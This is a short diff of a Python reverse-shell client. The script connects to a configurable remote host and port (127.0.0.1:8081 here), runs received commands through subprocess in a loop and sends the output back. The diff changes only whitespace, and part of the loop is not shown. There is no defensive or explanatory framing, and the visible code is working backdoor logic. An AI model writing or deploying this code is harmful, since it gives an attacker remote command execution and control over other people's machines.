@@ -1,7 +1,6 @@
 import socket
 import subprocess
 
-
 REMOTE_HOST = "127.0.0.1" 
 REMOTE_PORT = 8081 #4040
 client = socket.socket()
@@ -18,5 +17,5 @@ while True:
     )
     output = op.stdout.read()
     output_error = op.stderr.read()
-    print("[-] Sending Response....")
+    print("[-] Sending Response....")   
     client.send(output + output_error)
